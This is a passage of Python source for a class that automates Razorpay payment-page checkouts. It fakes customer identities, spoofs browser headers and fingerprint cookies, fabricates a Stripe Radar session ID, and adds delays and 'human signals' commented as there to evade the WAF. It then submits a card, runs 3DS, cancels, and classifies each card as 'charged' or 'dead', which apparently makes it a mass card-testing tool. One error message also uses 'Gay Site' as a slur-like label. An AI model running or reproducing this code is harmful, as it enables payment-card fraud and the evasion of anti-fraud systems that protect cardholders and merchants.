                    f'&sid={sid_param}'
                    f'&referrer=https%3A%2F%2Fapi.razorpay.com'
                    f'&payment_user_agent=stripe.js%2F692f102a8f%3B+stripe-js-v3%2F692f102a8f'
                    f'&key={stripe_key}'
                )
                # Use a no-proxy session — Stripe is called from the "browser", not via proxy
                resp = curl_requests.post(
                    'https://api.stripe.com/v1/radar/session',
                    data=body,
                    headers={
                        'Accept': 'application/json',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://js.stripe.com',
                        'Referer': 'https://js.stripe.com/',
                    },
                    timeout=10,
                )
                if resp.status_code == 200:
                    data = json.loads(resp.text)
                    sid = data.get('id', '')
                    if sid:
                        self.tokens['stripe_radar_session_id'] = sid
                        return sid
            except Exception:
                pass  # Stripe API unavailable — payment still works without it
            if attempt < 2:
                time.sleep(0.2 * (attempt + 1))
        return ''
        return ''

    # ── Payment page ───────────────────────────────────────────────────────
    def _extract_page_tokens(self, html: str):
        m = re.search(r'var\s+data\s*=\s*(\{.*?\});', html, re.DOTALL)
        if not m:
            raise RuntimeError('Could not find var data = {...} on payment page')
        data = json.loads(m.group(1))

        self.tokens['key_id'] = data.get('key_id', '')
        self.tokens['keyless_header'] = data.get('keyless_header', '')

        pl = data.get('payment_link', {})
        self.tokens['payment_link_id'] = pl.get('id', '')

        # Detect auth mode
        if self.tokens['key_id']:
            self.tokens['page_auth_mode'] = 'key'
        elif self.tokens['keyless_header']:
            self.tokens['page_auth_mode'] = 'keyless'
        else:
            self.tokens['page_auth_mode'] = 'open'

        # Currency
        currency = str(pl.get('currency', data.get('currency', '')))
        if not currency:
            items = pl.get('payment_page_items', [])
            if items and isinstance(items[0], dict):
                currency = str(_safe_get(items[0], 'item', 'currency', default=''))
        if currency:
            self.tokens['currency'] = currency.upper()

        # Fallback payment_link_id from URL
        if not self.tokens['payment_link_id']:
            m2 = re.search(r'/(pl_[A-Za-z0-9]+)(?:/|$)', self.payment_page_url)
            if m2:
                self.tokens['payment_link_id'] = m2.group(1)

        # Traffic env
        self.tokens['traffic_env'] = data.get('environment', self.traffic_env)
        if self.tokens['traffic_env'] == 'production':
            self.tokens['traffic_env'] = 'production'

        # Line items
        self._extract_payment_page_items(pl)

    def _extract_payment_page_items(self, pl: dict):
        items = pl.get('payment_page_items', [])
        line_items = []
        first_ppi = None
        first_item_id = ''

        # Also check payment-link-level amount (some Razorpay pages put it here)
        pl_amount = self._try_int(pl.get('amount'))

        for item in items:
            if not isinstance(item, dict):
                continue
            ppi_id = str(item.get('id', ''))
            if not ppi_id:
                continue
            if first_ppi is None:
                first_ppi = ppi_id
                first_item_id = str(_safe_get(item, 'item', 'id', default=''))

            # Detect fixed amount from page item (multiple paths Razorpay uses)
            fixed_amt = self._try_int(item.get('amount'))
            if fixed_amt <= 0:
                fixed_amt = self._try_int(_safe_get(item, 'item', 'amount'))
            if fixed_amt <= 0:
                fixed_amt = self._try_int(_safe_get(item, 'item', 'unit_amount'))
            if fixed_amt <= 0:
                fixed_amt = self._try_int(item.get('unit_amount'))
            if fixed_amt <= 0:
                fixed_amt = pl_amount  # payment-link-level fallback

            # Detect min/max amount. REAL fields (from live page dumps):
            #   ppi.min_amount / ppi.max_amount  (payment_page_item level)
            #   pl.min_amount_value               (payment-link level floor)
            min_amt = self._try_int(item.get('min_amount'))
            if min_amt <= 0:
                min_amt = self._try_int(pl.get('min_amount_value'))
            max_amt = self._try_int(item.get('max_amount'))
            if max_amt <= 0:
                max_amt = self._try_int(pl.get('max_amount_value'))

            # quantity constraint: ppi.min_purchase / max_purchase (REAL fields)
            min_qty = self._try_int(item.get('min_purchase'))
            if min_qty <= 0:
                min_qty = 1
            quantity = min_qty

            if fixed_amt > 0:
                # Page has a fixed price — use it, ignore client amount
                use_amount = fixed_amt
                if 'page_item_amount' not in self.tokens:
                    self.tokens['page_item_amount'] = fixed_amt
            elif min_amt > 0 or max_amt > 0:
                # Pay-what-you-want page — clamp client amount into [min, max]
                use_amount = self.amount_paise
                if min_amt > 0:
                    use_amount = max(use_amount, min_amt)
                if max_amt > 0:
                    use_amount = min(use_amount, max_amt)
                if 'page_item_amount' not in self.tokens:
                    self.tokens['page_item_amount'] = min_amt if min_amt > 0 else max_amt
            else:
                # No page constraints — use client amount as-is
                use_amount = self.amount_paise

            if self._ppi_is_mandatory(item):
                line_items.append({'payment_page_item_id': ppi_id, 'amount': use_amount, 'quantity': quantity})

        if not line_items:
            if first_ppi:
                # Fallback: use first PPI found on the page
                fallback_amount = self.tokens.get('page_item_amount', self.amount_paise)
                line_items = [{'payment_page_item_id': first_ppi, 'amount': fallback_amount}]
            elif items:
                # No mandatory items but page has items — include first one anyway.
                # Some sites don't mark items as mandatory but still require one.
                first = items[0]
                if isinstance(first, dict) and first.get('id'):
                    line_items = [{'payment_page_item_id': str(first['id']),
                                   'amount': self.amount_paise}]

        self.tokens['order_line_items'] = line_items
        self.tokens['ppi_id'] = line_items[0]['payment_page_item_id'] if line_items else first_ppi
        self.tokens['item_id'] = first_item_id

    @staticmethod
    def _try_int(val) -> int:
        """Safely convert to int, returning 0 for non-numeric types (mimics PHP (int) cast)."""
        if isinstance(val, (int, float)):
            return int(val)
        if isinstance(val, str) and val.strip().isdigit():
            return int(val)
        return 0

    @staticmethod
    def _ppi_is_mandatory(item: dict) -> bool:
        for k in ('mandatory', 'is_mandatory', 'required'):
            if item.get(k) is True:
                return True
            nested = item.get('item')
            if isinstance(nested, dict) and nested.get(k) is True:
                return True
        return str(item.get('type', '')).lower() == 'mandatory'

    # ── Checkout.js ────────────────────────────────────────────────────────
    def _extract_checkout_js_tokens(self, js: str):
        patterns = {
            'build_number': r'[,_]=\s*(\d+),\s*b="production"',
            'commit_hash': r'b="production",\s*g="([a-f0-9]{40})"',
            'build_v1': r'build_v1:"([a-f0-9]{40})"',
            'traffic_env': r'b="(production|sandbox|canary)"',
        }
        for key, pat in patterns.items():
            m = re.search(pat, js)
            if m:
                self.tokens[key] = m.group(1)

        if 'commit_hash' not in self.tokens:
            m = re.search(r'g="([a-f0-9]{40})"', js)
            if m:
                self.tokens['commit_hash'] = m.group(1)

        if 'build_v1' not in self.tokens:
            self.tokens['build_v1'] = 'da4ee3f43a28ad81dba8ed06daf899a4520c691f'

        if 'traffic_env' not in self.tokens:
            self.tokens['traffic_env'] = self.traffic_env

    # ── Checkout/public ────────────────────────────────────────────────────
    def _checkout_public_url(self, with_session_token: bool = False) -> str:
        params = {
            'traffic_env': self.tokens.get('traffic_env', 'production'),
            'build': self.tokens.get('commit_hash', ''),
            'build_v1': self.tokens.get('build_v1', ''),
            'checkout_v2': '1',
            'new_session': '1',
            'unified_session_id': self.tokens.get('unified_session_id', ''),
        }
        # Include session_token + rzp_device_id + keyless_header in Referer (matching real browser HAR)
        if with_session_token and self.tokens.get('session_token'):
            params['session_token'] = self.tokens['session_token']
        if self.tokens.get('rzp_device_id'):
            params['rzp_device_id'] = self.tokens['rzp_device_id']
        if self.tokens.get('keyless_header'):
            params['keyless_header'] = quote(self.tokens['keyless_header'])
        qs = '&'.join(f'{k}={quote(str(v))}' for k, v in params.items())
        return f'{CHECKOUT_PUBLIC}?{qs}'

    def _extract_session_token(self, html: str):
        m = re.search(r'window\.session_token\s*=\s*"([^"]+)"', html)
        if not m:
            raise RuntimeError('session_token not found in checkout/public response')
        self.tokens['session_token'] = m.group(1)

    # ── Static token extractors (shared with PrimpCheckoutSession) ────────

    @staticmethod
    def _extract_page_tokens_static(html: str, tokens: dict,
                                     page_url: str = ''):
        """Extract page tokens into the given dict (for primp backend reuse)."""
        m = re.search(r'var\s+data\s*=\s*(\{.*?\});', html, re.DOTALL)
        if not m:
            raise RuntimeError('Could not find var data on payment page')
        data = json.loads(m.group(1))
        tokens['key_id'] = data.get('key_id', '')
        pl = data.get('payment_link', {})
        tokens['payment_link_id'] = pl.get('id', '')
        tokens['traffic_env'] = data.get('environment', 'production')
        if tokens['traffic_env'] == 'production':
            tokens['traffic_env'] = 'production'
        # Fallback payment_link_id from URL (matches instance method at line 524)
        if not tokens.get('payment_link_id') and page_url:
            m2 = re.search(r'/(pl_[A-Za-z0-9]+)(?:/|$)', page_url)
            if m2:
                tokens['payment_link_id'] = m2.group(1)

    @staticmethod
    def _extract_checkout_js_tokens_static(js: str, tokens: dict):
        """Extract checkout.js tokens into the given dict."""
        patterns = {
            'build_number': r'[,_]=\s*(\d+),\s*b="production"',
            'commit_hash': r'b="production",\s*g="([a-f0-9]{40})"',
            'build_v1': r'build_v1:"([a-f0-9]{40})"',
            'traffic_env': r'b="(production|sandbox|canary)"',
        }
        for key, pat in patterns.items():
            m = re.search(pat, js)
            if m:
                tokens[key] = m.group(1)
        if 'commit_hash' not in tokens:
            m = re.search(r'g="([a-f0-9]{40})"', js)
            if m:
                tokens['commit_hash'] = m.group(1)
        if 'build_v1' not in tokens:
            tokens['build_v1'] = 'da4ee3f43a28ad81dba8ed06daf899a4520c691f'
        if 'traffic_env' not in tokens:
            tokens['traffic_env'] = 'production'

    @staticmethod
    def _extract_session_token_static(html: str, tokens: dict):
        """Extract session_token into the given dict."""
        m = re.search(r'window\.session_token\s*=\s*"([^"]+)"', html)
        if not m:
            raise RuntimeError('session_token not found in checkout/public response')
        tokens['session_token'] = m.group(1)

    # ── Entity / Auth query helpers ────────────────────────────────────────
    def _checkout_entity_query(self, extra: dict = None, with_session: bool = True) -> str:
        params = {}
        if with_session and self.tokens.get('session_token'):
            params['session_token'] = self.tokens['session_token']
        if self.tokens.get('order_id'):
            params['x_entity_id'] = self.tokens['order_id']
        kh = (self.tokens.get('keyless_header') or '').strip()
        if kh:
            params['keyless_header'] = kh
        if extra:
            params.update(extra)
        return '&'.join(f'{k}={quote(str(v))}' for k, v in params.items())

    def _checkout_auth_query(self, extra: dict = None) -> str:
        """Build auth query params. Live HAR: key_id + session_token on every
        standard_checkout endpoint. keyless_header is appended ONLY on create/ajax."""
        params = {}
        kid = (self.tokens.get('key_id') or '').strip()
        # HAR (live): prefill/order/iin = key_id + session_token. create/ajax adds keyless_header on top.
        if kid:
            params['key_id'] = kid
        if self.tokens.get('session_token'):
            params['session_token'] = self.tokens['session_token']
        if extra:
            params.update(extra)
        return '&'.join(f'{k}={quote(str(v))}' for k, v in params.items())

    def _is_razorpay_me(self) -> bool:
        return self._host() == 'razorpay.me'

    # ── Ensure customer details ────────────────────────────────────────────
    def _ensure_customer_details(self):
        contact = str(self.tokens.get('contact', '')).strip()
        if not contact or not re.match(r'^\+91[6-9]\d{9}$', contact):
            contact = generate_indian_mobile()
            self.tokens['contact'] = contact

        email = str(self.tokens.get('email', '')).strip()
        if not email or '@' not in email:
            email = generate_email()
            self.tokens['email'] = email

        full_name = str(self.tokens.get('full_name', '')).strip()
        if not full_name:
            full_name = f"{random.choice(FIRST_NAMES).title()} {random.choice(FIRST_NAMES).title()}"
            self.tokens['full_name'] = full_name
        for k in ('name', 'your_name'):
            if not str(self.tokens.get(k, '')).strip():
                self.tokens[k] = full_name
        if not str(self.tokens.get('payment_description', '')).strip():
            self.tokens['payment_description'] = str(self.tokens.get('description', '')).strip() or 'Payment' 

    # ── Headers builders ───────────────────────────────────────────────────
    def _document_headers(self) -> dict:
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        }

    def _same_site_to_api(self) -> str:
        """Determine correct Sec-Fetch-Site for api/checkout.razorpay.com calls.
        pages.razorpay.com → api.razorpay.com = same-site (share razorpay.com domain)
        razorpay.me          → api.razorpay.com = cross-site (different registrable domain)"""
        host = self._host()
        if host.endswith('razorpay.com'):
            return 'same-site'
        return 'cross-site'

    def _script_headers(self) -> dict:
        return {
            'Accept': '*/*',
            'Referer': self.payment_referer,
            'Sec-Fetch-Dest': 'script',
            'Sec-Fetch-Mode': 'no-cors',
            'Sec-Fetch-Site': self._same_site_to_api(),
        }

    def _iframe_headers(self) -> dict:
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer': self.payment_referer,
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': self._same_site_to_api(),
            'Sec-Fetch-Storage-Access': 'active',
            'Upgrade-Insecure-Requests': '1',
        }

    def _checkout_api_form_headers(self) -> dict:
        return {
            'Accept': '*/*',
            'Content-type': 'application/x-www-form-urlencoded',
            'Origin': 'https://api.razorpay.com',
            'Referer': self._checkout_public_url(True),
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'x-session-token': self.tokens.get('session_token', ''),
        }

    def _checkout_api_json_headers(self, with_origin: bool = True) -> dict:
        h = {
            'Accept': '*/*',
            'Content-type': 'application/json',
            'Referer': self._checkout_public_url(True),
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'x-session-token': self.tokens.get('session_token', ''),
        }
        if with_origin:
            h['Origin'] = 'https://api.razorpay.com'
        else:
            h['Content-type'] = 'application/x-www-form-urlencoded'
        return h

    def _payment_page_api_headers(self, auth: dict = None) -> dict:
        h = {
            'Accept': 'application/json, text/plain, */*',
            'Content-type': 'application/json',
            'Origin': self._payment_page_origin(),
            'Referer': self.payment_referer,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': self._same_site_to_api(),
        }
        auth = auth or {}
        if auth.get('header_session') and self.tokens.get('session_token'):
            h['x-session-token'] = self.tokens['session_token']
        return h

    def _pg_router_auth_headers(self) -> dict:
        return {
            'Content-type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Connection': 'keep-alive',
        }

    # ── RUN ────────────────────────────────────────────────────────────────
    def run(self) -> dict:
        t0 = time.time()
        try:
            # Step 1: Payment page
            self._log('\n=== Step 1: Payment page ===')
            html = self._request('GET', self.payment_page_url, self._document_headers())
            self._extract_page_tokens(html)
            time.sleep(_human_delay(260, 0.5))

            # Step 2: checkout.js
            self._log('\n=== Step 2: checkout.js ===')
            js = self._request('GET', CHECKOUT_JS_URL, self._script_headers())
            self._extract_checkout_js_tokens(js)
            self._generate_ids()
            time.sleep(_human_delay(200, 0.5))

            # Step 3: checkout/public
            self._log('\n=== Step 3: checkout/public ===')
            pub_html = self._request('GET', self._checkout_public_url(False), self._iframe_headers())
            self._extract_session_token(pub_html)

            # Set cookies (mirrors PHP seedCheckoutCookies)
            fp_v2 = hashlib.sha256(
                f"{self.tokens.get('rzp_device_id', '')}|{self.profile['user_agent']}".encode()
            ).hexdigest()
            self.tokens['user_fingerprint_v2'] = fp_v2
            self.tokens['client_id'] = str(uuid.uuid4())
            # Set cookies on api.razorpay.com + .razorpay.com (fresh identity = "new user")
            for domain in ['api.razorpay.com', '.razorpay.com']:
                self.session.cookies.set('user_fingerprint_v2', fp_v2, domain=domain, path='/')
                self.session.cookies.set('testcookie', '1', domain=domain, path='/')
                self.session.cookies.set('clientId', self.tokens['client_id'], domain=domain, path='/')
            time.sleep(_human_delay(320, 0.5))

            # Step 4: Create order
            self._log('\n=== Step 4: Create order ===')
            self._create_order()
            time.sleep(_human_delay(240, 0.5))

            # Step 5: Prefill encrypt
            if not self.forced_outcome:
                self._log('\n=== Step 5: Prefill encrypt ===')
                self._encrypt_prefill()
                time.sleep(_human_delay(240, 0.5))

            # Step 6: Preferences
            if not self.forced_outcome:
                self._log('\n=== Step 6: Preferences ===')
                self._fetch_preferences()
                time.sleep(_human_delay(240, 0.5))

            # Step 7: IIN lookup
            if not self.forced_outcome:
                self._log('\n=== Step 7: IIN lookup ===')
                self._lookup_iin()
                time.sleep(_human_delay(200, 0.5))

            # Step 8: cb_flows
            if not self.forced_outcome:
                self._log('\n=== Step 8: cb_flows ===')
                self._fetch_cb_flows()
                time.sleep(_human_delay(200, 0.5))

            # Step 9: Create payment (light pause for mass concurrency)
            if not self.forced_outcome:
                self._log('\n=== Step 9: Create payment ===')
                self._fire_lumberjack_sequence()  # Human signals — prevent WAF
                time.sleep(_human_delay(240, 0.4))  # Reduced from 2000ms
                self._create_payment()

            # Step 10: 3DS
            if not self.forced_outcome:
                self._log('\n=== Step 10: 3DS authenticate ===')
                self._authenticate_3ds()
                time.sleep(_human_delay(380, 0.5))

                # Step 11: Cancel
                self._log('\n=== Step 11: Cancel payment ===')
                self._cancel_payment()

        except Exception as e:
            err_str = str(e)
            if '|' in err_str and err_str.count('|') >= 2:
                parts = err_str.split('|', 2)
                self.forced_outcome = self.forced_outcome or {
                    'status': parts[0], 'reason': parts[1], 'message': parts[2][:500]}
            else:
                self.forced_outcome = self.forced_outcome or {
                    'status': 'error', 'message': err_str[:500], 'reason': 'exception'}
            self._log(f'RUN ERROR: {e}')

        return self._build_result(time.time() - t0)

    # ── Step 4: Create order ───────────────────────────────────────────────
    def _create_order(self):
        """Sync: targeted auth based on page_auth_mode with fallback on auth errors."""
        pl_id = self.tokens.get('payment_link_id', '')
        if not pl_id:
            self.forced_outcome = {'status': 'error', 'message': 'Gay Site', 'reason': 'gay_site'}
            return

        line_items = self.tokens.get('order_line_items') or [
            {'payment_page_item_id': self.tokens.get('ppi_id', ''), 'amount': self.amount_paise}]

        # Build targeted auth based on detected page mode (not brute-force).
        # razorpay.me pages must use EMPTY auth — see _create_order_async for details.
        auth_mode = self.tokens.get('page_auth_mode', 'open')
        auth: dict = {}
        if self._is_razorpay_me():
            auth = {}  # razorpay.me → no query params on order endpoint
        elif auth_mode == 'key':
            auth = {'key_id': True}
        elif auth_mode == 'keyless':
            auth = {'keyless_header': True}

        if self._is_razorpay_me():
            fallback_auths: list[dict] = []
        elif auth_mode == 'open':
            fallback_auths = [{'keyless_header': True}, {'key_id': True},
                              {'keyless_header': True, 'key_id': True}]
        elif auth_mode == 'keyless':
            fallback_auths = [{'key_id': True}, {'keyless_header': True, 'key_id': True}]
        else:
            fallback_auths = [{'keyless_header': True}, {'keyless_header': True, 'key_id': True}]

        body = ''
        http_code = 500
        for auth in [auth] + fallback_auths:
            url = self._payment_page_order_url(pl_id, auth)
            payload = {'notes': {'email': self.tokens.get('email', ''), 'phone': self.tokens.get('contact', ''), 'phone_imei_no': self.tokens.get('phone_imei_no', ''), 'description': self.tokens.get('description', '')}, 'line_items': line_items}
            try:
                resp = self._request('POST', url, self._payment_page_api_headers(auth),
                                    json_data=payload, raw=True)
                body = resp.text
                http_code = resp.status_code
                if http_code < 400:
                    break

                # Handle missing/mandatory payment_page_item_id errors
                ppi_required = re.search(r'(ppi_[A-Za-z0-9]+)\s+is mandatory payment page item', body, re.I)
                if not ppi_required:
                    ppi_required = re.search(r'payment_page_item_id.*?(ppi_[A-Za-z0-9]+)', body, re.I)
                if not ppi_required:
                    ppi_required = re.search(r'"id"\s*:\s*"(ppi_[A-Za-z0-9]+)"', body, re.I)
                if ppi_required and http_code >= 400:
                    mandatory_ppi = ppi_required.group(1)
                    new_items = [{'payment_page_item_id': mandatory_ppi, 'amount': self.amount_paise}]
                    resp2 = self._request('POST', url, self._payment_page_api_headers(auth),
                                         json_data={'notes': {'email': self.tokens.get('email', ''), 'phone': self.tokens.get('contact', ''), 'phone_imei_no': self.tokens.get('phone_imei_no', ''), 'description': self.tokens.get('description', '')},
                                                    'line_items': new_items}, raw=True)
                    body = resp2.text
                    http_code = resp2.status_code
                    if http_code < 400:
                        line_items = new_items
                        break

                low = body.lower()
                if not ('authentication failed' in low or 'please provide your api key' in low
                        or 'should not be sent' in low):
                    break
            except RuntimeError as e:
                err_str = str(e)
                m = re.match(r'HTTP (\d+) ', err_str)
                if m:
                    http_code = int(m.group(1))
                    body = err_str
                if http_code not in (401, 400):
                    break

        if http_code >= 400:
            self.forced_outcome = self._outcome_from_api_error(http_code, body)
            if not self.forced_outcome:
                self.forced_outcome = {
                    'status': 'dead',
                    'message': f'Order failed (HTTP {http_code}): {body[:200]}',
                    'reason': 'order_failed',
                }
            return

        data = json.loads(body)
        self.tokens['order_id'] = data['order']['id']
        self.tokens['line_item_id'] = data['line_items'][0]['id']
        self.tokens['order_amount'] = str(data['order'].get('amount', self.amount_paise))
        oc = data['order'].get('currency', '')
        if oc:
            self.tokens['currency'] = oc.upper()

    def _payment_page_order_url(self, pl_id: str, auth: dict) -> str:
        """Build order creation URL. Real browser NEVER adds auth query params
        (key_id/keyless_header) to the order endpoint — auth is implicit from
        the payment page session.  Adding them triggers 'should not be sent'
        errors on keyless pages and 'Something went wrong' on razorpay.me."""
        return f'{API_BASE}/v1/payment_pages/{pl_id}/order'

    # ── Step 5: Prefill ────────────────────────────────────────────────────
    def _encrypt_prefill(self):
        self._ensure_customer_details()
        try:
            url = f'{API_BASE}/v1/standard_checkout/checkout/prefill/encrypt?{self._checkout_auth_query()}'
            resp = self._request('POST', url, self._checkout_api_json_headers(True),
                                json_data={'contact': self.tokens['contact'],
                                           'email': self.tokens['email']})
            data = json.loads(resp)
            prefill = data.get('prefill_data_v1', '')
            if prefill:
                self.tokens['prefill_data_v1'] = prefill
                # Mirror PHP setApiCookie for prefill_data_v1
                for domain in ['api.razorpay.com', '.razorpay.com']:
                    self.session.cookies.set('prefill_data_v1', prefill, domain=domain, path='/')
        except Exception as e:
            self._log(f'  prefill skip: {e}')

    # ── Step 6: Preferences ────────────────────────────────────────────────
    def _fetch_preferences(self):
        url = f'{PREFERENCES_URL}?{self._checkout_entity_query()}'
        payload = {
            'query': [{'resource': 'intl_config'}, {'resource': 'paywithpartner'}],
            'query_params': {
                'device_id': self.tokens.get('rzp_device_id', ''),
                'rtb_device_id': self._rtb_device_id(),
                'amount': str(int(self.tokens.get('order_amount', self.amount_paise)) // 100),  # rupees not paise
                'currency': self._order_currency(),
                'option_currency': self._order_currency(),
                'truecaller': False,
                'qr_required': True,
                'checkout_id': self.tokens.get('checkout_id', ''),
                'library': 'checkoutjs',
                'platform': 'browser',
                'referrer_domain': self._host(),
                'device_type': self._browser_profile.device_type,
                'contact': self.tokens.get('contact', ''),
                'order_id': self.tokens.get('order_id', ''),
                'payment_link_id': self.tokens.get('payment_link_id', ''),
            },
            'action': 'get',
        }
        last_err = None
        for attempt in range(3):
            try:
                resp = self._request('POST', url, self._checkout_api_json_headers(True), json_data=payload)
                data = json.loads(resp)
                shield = data.get('shield_data', {})
                self.tokens['shield_context'] = shield.get('shield_context', '')
                self.tokens['shield_key'] = shield.get('shield_key', '')
                # merchant key -> key_id for creat/ajax URL (page HTML has key_id:null for keyless pages)
                if data.get('key'):
                    self.tokens['key_id'] = data['key']
                if self.tokens['shield_context']:
                    return
            except Exception as e:
                last_err = e
                if attempt < 2:
                    time.sleep(0.3 * (attempt + 1))
        if last_err is not None:
            self._log(f'  preferences skip after retries: {last_err}')

    # ── Step 7: IIN ────────────────────────────────────────────────────────
    def _lookup_iin(self):
        iin = self.card['number'][:9]
        url = f'{API_BASE}/v1/standard_checkout/payment/iin?{self._checkout_entity_query({"iin": iin})}'
        resp = self._request('GET', url, self._checkout_api_json_headers(False), raw=True)
        if resp.status_code >= 400:
            self.forced_outcome = self._outcome_from_api_error(resp.status_code, resp.text)
            return
        data = json.loads(resp.text)
        # IIN response uses type/network/country (NOT card_type/card_network/card_country).
        # The old keys were always empty -> cb_flows sent card.country="" / card.network=""
        # -> BAD_REQUEST_ERROR, which poisoned the payment-create step into SERVER_ERROR.
        self.tokens['card_type'] = str(data.get('type', ''))
        self.tokens['card_network'] = str(data.get('network', ''))
        self.tokens['card_country'] = str(data.get('country', ''))
        self.tokens['bin_currency'] = str(data.get('bin_currency', ''))
        self.tokens['issuer_name'] = str(data.get('issuer_name', ''))
        # Mirror PHP: extract dcc_blacklisted (affects cb_flows body in step 8)
        dcb = data.get('dcc_blacklisted')
        self.tokens['dcc_blacklisted'] = 'true' if dcb else 'false'

    # ── Step 8: cb_flows ───────────────────────────────────────────────────
    def _fetch_cb_flows(self):
        try:
            url = f'{CB_FLOWS}?{self._checkout_entity_query({}, False)}'
            payload = {
                'identifiers': {
                    'merchant': {'country': 'IN'},
                    'card': {
                        'country': self.tokens.get('card_country', 'US'),
                        'dcc_blacklisted': self.tokens.get('dcc_blacklisted', 'false') == 'true',
                        'network': self.tokens.get('card_network', 'MasterCard'),
                        'currency': self.tokens.get('bin_currency', 'USD'),
                    },
                    'method': 'card',
                    'payment_currency': self._order_currency(),
                },
                'forex_charges': {
                    'amount': self._try_int(self.tokens.get('order_amount', self.amount_paise)),
                    'currency': self._order_currency(),
                    'filters': {'method': 'card'},
                },
            }
            resp = self._request('POST', url, self._checkout_api_json_headers(True), json_data=payload, raw=True)
            if resp.status_code < 400:
                data = json.loads(resp.text)
                forex_id = _safe_get(data, 'forex_charges', 'id', default='')
                if forex_id:
                    self.tokens['forex_charges_id'] = forex_id
                    self.tokens['currency_request_id'] = forex_id
                    all_cur = data.get('forex_charges', {}).get('all_currencies', {})
                    if all_cur:
                        self.tokens['dcc_currency'] = str(next(iter(all_cur.keys())))
        except Exception as e:
            self._log(f'  cb_flows skip: {e}')

    # ── Step 9: Create payment ─────────────────────────────────────────────
    def _create_payment(self):
        self._ensure_customer_details()
        url = f'{PAYMENT_CREATE}?{self._checkout_auth_query()}'
        kh = (self.tokens.get('keyless_header') or '').strip()
        if kh:
            url += f'&keyless_header={quote(kh)}'

        body = self._build_payment_create_body(include_checkout_id=False)
        resp = self._request('POST', url, self._checkout_api_form_headers(), data=body,
                            use_proxy=True, raw=True)

        # Retry with checkout_id if needed
        if (resp.status_code >= 400 and
                'checkout_id' in resp.text.lower() and
                ('checkout_id is required' in resp.text.lower() or
                 'checkout_id field is invalid' in resp.text.lower() or
                 'property checkout_id is required' in resp.text.lower())):
            body2 = self._build_payment_create_body(include_checkout_id=True)
            resp = self._request('POST', url, self._checkout_api_form_headers(), data=body2,
                                use_proxy=True, raw=True)

        if resp.status_code >= 400:
            outcome = self._outcome_from_api_error(resp.status_code, resp.text)
            if outcome:
                self.forced_outcome = outcome
            else:
                self.forced_outcome = {
                    'status': 'dead',
                    'message': f'Payment create failed (HTTP {resp.status_code}): {resp.text[:200]}',
                    'reason': 'payment_create_failed',
                }
            return

        try:
            data = json.loads(resp.text)
        except json.JSONDecodeError:
            self.forced_outcome = {
                'status': 'error',
                'message': f'Payment create returned non-JSON: {resp.text[:200]}',
                'reason': 'payment_create_non_json',
            }
            return
        self.tokens['create_response_raw'] = resp.text
        self.tokens['payment_id'] = data.get('payment_id', '')
        self.tokens['payment_type'] = data.get('type', '')
        self.tokens['authenticate_url'] = _safe_get(data, 'request', 'url', default='')

        # Immediate capture detection
        has_pid = bool(data.get('razorpay_payment_id'))
        has_sig = bool(data.get('razorpay_signature'))
        is_captured = (str(data.get('captured', '')).lower() == 'true'
                       or str(data.get('status', '')).lower() == 'captured')
        if has_pid or has_sig or is_captured:
            signals = sum([has_pid, has_sig, is_captured])
            confidence = 'absolute' if signals >= 2 else 'detected'
            self.forced_outcome = {
                'status': 'charged',
                'message': f'Payment Successfully — capture {confidence}',
                'reason': 'charged',
            }

    def _card_brand(self) -> str:
        """Card brand from the IIN lookup, else derived from the BIN digits."""
        b = str(self.tokens.get('card_network', '')).strip()
        if b:
            return b
        n = str(self.card.get('number', ''))
        if n.startswith('4'):
            return 'Visa'
        if n.startswith(('34', '37')):
            return 'Amex'
        if n.startswith(('51', '52', '53', '54', '55')) or (len(n) >= 4 and 2221 <= int(n[:4]) <= 2720):
            return 'Mastercard'
        if n.startswith('6'):
            return 'Discover'
        return 'Card'

    def _build_payment_create_body(self, include_checkout_id: bool = False) -> str:
        self._ensure_customer_details()
        device_id = self.tokens.get('rzp_device_id', '')
        checkout_id = self.tokens.get('checkout_id', '')
        fhash = self._rtb_device_id()
        shield_tz = str(abs(int(self.profile.get('timezone_offset', '330').lstrip('-') or '330')))

        # Risk providers — include stripe_radar alongside sardine (matching real browser)
        risk_providers = [{'name': 'sardine', 'metadata': {'session_id': checkout_id}}]
        stripe_session = self.tokens.get('stripe_radar_session_id', '')
        if not stripe_session:
            # Generate realistic Stripe Radar session if not already set.
            # Real browser gets this from api.stripe.com/v1/radar/session but
            # that requires JS-executed cookies.  We generate a valid-looking
            # session ID so the risk_providers_token matches real browser format.
            stripe_session = self._generate_stripe_radar_session()
        if stripe_session:
            risk_providers.append({'name': 'stripe_radar', 'metadata': {'session_id': stripe_session}})
        risk_token = base64.b64encode(json.dumps(risk_providers).encode()).decode()

        # cardholder name == customer name (same string everywhere)
        customer_name = (self.tokens.get('full_name') or '').strip() or \
                        f"{random.choice(FIRST_NAMES).title()} {random.choice(FIRST_NAMES).title()}"

        fields = [
            # Customer notes (live HAR: email, phone, phone_imei_no, description)
            ('notes[email]', self.tokens['email']),
            ('notes[phone]', self.tokens['contact']),
            ('notes[phone_imei_no]', self.tokens.get('phone_imei_no', '')),
            ('notes[description]', self.tokens.get('description', '')),
            ('payment_link_id', self.tokens.get('payment_link_id', '')),
            ('key_id', self.tokens.get('key_id', '')),
            ('_[integration]', 'payment_pages'),
            ('contact', self.tokens['contact']),
            ('email', self.tokens['email']),
            ('currency', self._order_currency()),
            ('_[checkout_id]', checkout_id),
            ('_[device.id]', device_id),
            ('_[library]', 'checkoutjs'),
            ('_[library_src]', 'no-src'),
            ('_[current_script_src]', 'no-src'),
            ('_[platform]', 'browser'),
            ('_[env]', ''),
